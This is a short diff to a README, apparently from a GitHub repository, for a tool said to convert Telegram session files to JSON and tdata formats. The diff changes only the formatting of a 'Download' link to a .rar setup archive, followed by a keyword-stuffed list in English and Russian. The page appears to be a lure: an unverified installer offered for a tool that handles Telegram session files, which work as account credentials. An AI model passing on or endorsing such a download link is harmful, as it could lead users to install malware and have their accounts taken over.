@@ -4,7 +4,7 @@
 
 Converts native Telegram session files to JSON format, which is compatible with Telegram Prime and other clients that support it. Conversion from JSON to tdat format is also available, with support for Pyrogram.✅
 
-#[Download](https://github.com/matt-kingeng2000o0/TGtoJSON-2026/releases/download/release/Setup-v25.1.7.rar)
+[Download]#(https://github.com/matt-kingeng2000o0/TGtoJSON-2026/releases/download/release/Setup-v25.1.7.rar)
 
 Keywords:
 Json converter telegram pytogram tg-to-json telegram-to-json jsontg converte telegram to tdata телеграм конвертер тдата-конвертер конвертация тдата 
